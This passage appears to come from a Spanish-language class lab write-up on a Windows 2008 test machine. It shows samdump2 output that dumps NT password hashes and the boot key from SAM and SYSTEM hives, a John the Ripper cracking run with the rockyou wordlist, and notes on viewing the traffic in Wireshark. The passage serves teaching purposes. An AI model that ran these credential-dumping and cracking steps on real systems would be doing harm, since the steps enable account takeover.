        fa20a3086f50e56e6c618766d13a8cdf
        ******************** 2 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000001F5
        disabled = 1

        username len=5, off=17c
        lm_hashoffset = 200, lm_size = 4
        nt_hashoffset = 204, nt_size = 4
        ******************** 3 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003E8
        disabled = 0

        username len=7, off=188
        lm_hashoffset = 1e0, lm_size = 4
        nt_hashoffset = 1e4, nt_size = 14

        f912acd0c16b4d18fdc90f490d7b463f
        ******************** 4 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003E9
        disabled = 1

        username len=4, off=1a0
        lm_hashoffset = 20c, lm_size = 4
        nt_hashoffset = 210, nt_size = 4
        ******************** 5 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EA
        disabled = 0

        username len=11, off=188
        lm_hashoffset = 214, lm_size = 4
        nt_hashoffset = 218, nt_size = 14

        2e18aab4eda3d670b5f12cd82e7755fb
        ******************** 6 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EC
        disabled = 0

        username len=11, off=188
        lm_hashoffset = 1a8, lm_size = 4
        nt_hashoffset = 1ac, nt_size = 14

        0c5b3ff1e0b06ab05d4fd60c7928c6be
        ******************** 7 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003ED
        disabled = 0

        username len=14, off=1a0
        lm_hashoffset = 1c4, lm_size = 4
        nt_hashoffset = 1c8, nt_size = 14

        73488d1b797abfa0d59a4b21dad5f290
        ******************** 8 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EE
        disabled = 0

        username len=8, off=1a0
        lm_hashoffset = 1b8, lm_size = 4
        nt_hashoffset = 1bc, nt_size = 14

        0f429642ad820b6de09550df4adbf772
        ******************** 9 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EF
        disabled = 0

        username len=11, off=1a0
        lm_hashoffset = 1c0, lm_size = 4
        nt_hashoffset = 1c4, nt_size = 14

        b02f8ea666e7d9ed379ee3156d266a7f
        ******************** 10 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F0
        disabled = 0

        username len=11, off=1a0
        lm_hashoffset = 1c0, lm_size = 4
        nt_hashoffset = 1c4, nt_size = 14

        fe8c262cbcfae557721400ecaac1aa72
        ******************** 11 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F1
        disabled = 0

        username len=10, off=1a0
        lm_hashoffset = 1bc, lm_size = 4
        nt_hashoffset = 1c0, nt_size = 14

        c4db5aa1a1d3696fae275836a0f069da
        ******************** 12 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F2
        disabled = 0

        username len=11, off=1a0
        lm_hashoffset = 1c0, lm_size = 4
        nt_hashoffset = 1c4, nt_size = 14

        6540a2b77e513c238e1fa692216463f1
        ******************** 13 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F3
        disabled = 0

        username len=16, off=1a0
        lm_hashoffset = 1c8, lm_size = 4
        nt_hashoffset = 1cc, nt_size = 14

        38aa5c1c4eff5b995492121f5bf38ebe
        ******************** 14 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F4
        disabled = 0

        username len=12, off=1a0
        lm_hashoffset = 1c0, lm_size = 4
        nt_hashoffset = 1c4, nt_size = 14

        291e696f34b7e48b6a6b0c082b484745
        ******************** 15 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F5
        disabled = 0

        username len=16, off=1a0
        lm_hashoffset = 1c8, lm_size = 4
        nt_hashoffset = 1cc, nt_size = 14

        92c0f7a5850cefbbc23c7ac2914b2484
        ******************** 16 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F6
        disabled = 0

        username len=9, off=1a0
        lm_hashoffset = 1bc, lm_size = 4
        nt_hashoffset = 1c0, nt_size = 14

        65d218fee53cf8aa694735b77bbf3b12
        ******************** 17 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F7
        disabled = 0

        username len=10, off=188
        lm_hashoffset = 1a4, lm_size = 4
        nt_hashoffset = 1a8, nt_size = 14

        22f5383f19aec638b97cf25c64f54b21
        ******************** 18 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F8
        disabled = 0

        username len=6, off=1a0
        lm_hashoffset = 1b4, lm_size = 4
        nt_hashoffset = 1b8, nt_size = 14

        86ce3391d95ed4553cff3820ea0f0086
        ******************** 19 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F9
        disabled = 0

        username len=9, off=1a0
        lm_hashoffset = 1bc, lm_size = 4
        nt_hashoffset = 1c0, nt_size = 14

        6f9220849c915aab2f88f32fb9404617
        ******************** 20 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003FA
        disabled = 0

        username len=8, off=1a0
        lm_hashoffset = 1b8, lm_size = 4
        nt_hashoffset = 1bc, nt_size = 14

        16f4b05449e3ebabdbedcdb2d90ceda5
        ******************** -1 ********************
        ```

- 
```bash
    ┌──(user㉿kali)-[~/Downloads/windows_files]
    └─$ rm user_win2008.txt 
```
- 
```bash
    ┌──(user㉿kali)-[~/Downloads/windows_files]
    └─$ samdump2 SYSTEM SAM -o user_win2008.txt -d    
```
```bash
    Root Key : CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}
    Default ControlSet: 001
    ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\JD *********
    n->classname_len = 16 b = 2c169c
    ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\Skew1 *********
    n->classname_len = 16 b = 2c1824
    ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\GBG *********
    n->classname_len = 16 b = 2c18d4
    ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\Data *********
    n->classname_len = 16 b = 3241dc
    Bootkey unsorted: ef1bc80b7b3fcddb4793e845b63d258e
    Root Key : CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}
    ******************** 1 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000001F4
    disabled = 0

    username len=13, off=188
    lm_hashoffset = 230, lm_size = 4
    nt_hashoffset = 234, nt_size = 14

    fa20a3086f50e56e6c618766d13a8cdf
    ******************** 2 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000001F5
    disabled = 1

    username len=5, off=17c
    lm_hashoffset = 200, lm_size = 4
    nt_hashoffset = 204, nt_size = 4
    ******************** 3 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003E8
    disabled = 0

    username len=7, off=188
    lm_hashoffset = 1e0, lm_size = 4
    nt_hashoffset = 1e4, nt_size = 14

    f912acd0c16b4d18fdc90f490d7b463f
    ******************** 4 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003E9
    disabled = 1

    username len=4, off=1a0
    lm_hashoffset = 20c, lm_size = 4
    nt_hashoffset = 210, nt_size = 4
    ******************** 5 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EA
    disabled = 0

    username len=11, off=188
    lm_hashoffset = 214, lm_size = 4
    nt_hashoffset = 218, nt_size = 14

    2e18aab4eda3d670b5f12cd82e7755fb
    ******************** 6 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EC
    disabled = 0

    username len=11, off=188
    lm_hashoffset = 1a8, lm_size = 4
    nt_hashoffset = 1ac, nt_size = 14

    0c5b3ff1e0b06ab05d4fd60c7928c6be
    ******************** 7 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003ED
    disabled = 0

    username len=14, off=1a0
    lm_hashoffset = 1c4, lm_size = 4
    nt_hashoffset = 1c8, nt_size = 14

    73488d1b797abfa0d59a4b21dad5f290
    ******************** 8 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EE
    disabled = 0

    username len=8, off=1a0
    lm_hashoffset = 1b8, lm_size = 4
    nt_hashoffset = 1bc, nt_size = 14

    0f429642ad820b6de09550df4adbf772
    ******************** 9 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003EF
    disabled = 0

    username len=11, off=1a0
    lm_hashoffset = 1c0, lm_size = 4
    nt_hashoffset = 1c4, nt_size = 14

    b02f8ea666e7d9ed379ee3156d266a7f
    ******************** 10 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F0
    disabled = 0

    username len=11, off=1a0
    lm_hashoffset = 1c0, lm_size = 4
    nt_hashoffset = 1c4, nt_size = 14

    fe8c262cbcfae557721400ecaac1aa72
    ******************** 11 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F1
    disabled = 0

    username len=10, off=1a0
    lm_hashoffset = 1bc, lm_size = 4
    nt_hashoffset = 1c0, nt_size = 14

    c4db5aa1a1d3696fae275836a0f069da
    ******************** 12 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F2
    disabled = 0

    username len=11, off=1a0
    lm_hashoffset = 1c0, lm_size = 4
    nt_hashoffset = 1c4, nt_size = 14

    6540a2b77e513c238e1fa692216463f1
    ******************** 13 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F3
    disabled = 0

    username len=16, off=1a0
    lm_hashoffset = 1c8, lm_size = 4
    nt_hashoffset = 1cc, nt_size = 14

    38aa5c1c4eff5b995492121f5bf38ebe
    ******************** 14 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F4
    disabled = 0

    username len=12, off=1a0
    lm_hashoffset = 1c0, lm_size = 4
    nt_hashoffset = 1c4, nt_size = 14

    291e696f34b7e48b6a6b0c082b484745
    ******************** 15 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F5
    disabled = 0

    username len=16, off=1a0
    lm_hashoffset = 1c8, lm_size = 4
    nt_hashoffset = 1cc, nt_size = 14

    92c0f7a5850cefbbc23c7ac2914b2484
    ******************** 16 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F6
    disabled = 0

    username len=9, off=1a0
    lm_hashoffset = 1bc, lm_size = 4
    nt_hashoffset = 1c0, nt_size = 14

    65d218fee53cf8aa694735b77bbf3b12
    ******************** 17 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F7
    disabled = 0

    username len=10, off=188
    lm_hashoffset = 1a4, lm_size = 4
    nt_hashoffset = 1a8, nt_size = 14

    22f5383f19aec638b97cf25c64f54b21
    ******************** 18 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F8
    disabled = 0

    username len=6, off=1a0
    lm_hashoffset = 1b4, lm_size = 4
    nt_hashoffset = 1b8, nt_size = 14

    86ce3391d95ed4553cff3820ea0f0086
    ******************** 19 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003F9
    disabled = 0

    username len=9, off=1a0
    lm_hashoffset = 1bc, lm_size = 4
    nt_hashoffset = 1c0, nt_size = 14

    6f9220849c915aab2f88f32fb9404617
    ******************** 20 ********************
    keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000003FA
    disabled = 0

    username len=8, off=1a0
    lm_hashoffset = 1b8, lm_size = 4
    nt_hashoffset = 1bc, nt_size = 14

    16f4b05449e3ebabdbedcdb2d90ceda5
    ******************** -1 ********************
```
- 
```bash
    ┌──(user㉿kali)-[~/Downloads/windows_files]
    └─$ john --format=NT --wordlist=../diccionarios/rockyou.txt user_win2008.txt 
    Using default input encoding: UTF-8
    Loaded 18 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
    Remaining 14 password hashes with no different salts
    Warning: no OpenMP support for this hash type, consider --fork=2
    Press 'q' or Ctrl-C to abort, almost any other key for status
    0g 0:00:00:02 DONE (2024-11-01 07:07) 0g/s 6734Kp/s 6734Kc/s 94277KC/s      mara..*7¡Vamos!
    Session completed.
```

***

## Adicionales

- Visualizar escaneo en WIRESHARK

    Wireshark es una herramienta de análisis de red que permite capturar y examinar el tráfico de datos que circula por una red en tiempo real, para diagnosticar problemas de red, analizar protocolos y comprender el comportamiento del tráfico.


    - Luego de ingresar con usuario y contraseña se puede visualizar el trafico de red en WIRESHARK
    
    ![figura](/assets/images/2024-10-03-clase04-s05/login_vagrant.png)

    - Ya que las credenciales son correctas podemos observar los protocolos que se muestran en la siguiente imagen:

    **ACK** es producida por la maquina atacante.
    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 175423.png)



    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 175225.png)
